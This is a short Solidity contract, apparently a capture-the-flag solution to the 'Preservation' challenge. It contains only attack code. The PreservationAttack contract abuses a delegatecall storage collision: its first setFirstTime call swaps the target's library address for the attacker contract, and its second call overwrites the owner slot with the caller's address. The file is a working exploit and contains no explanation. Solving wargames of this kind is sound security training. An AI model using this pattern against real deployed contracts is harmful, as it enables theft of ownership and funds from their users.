// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address whatever;
    address whatever2;
    uint256 storedTime;

    function attack(address _target) public {
        IPreservation target = IPreservation(_target);

        target.setFirstTime(uint256(address(this)));
        target.setFirstTime(uint256(msg.sender));
    }

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
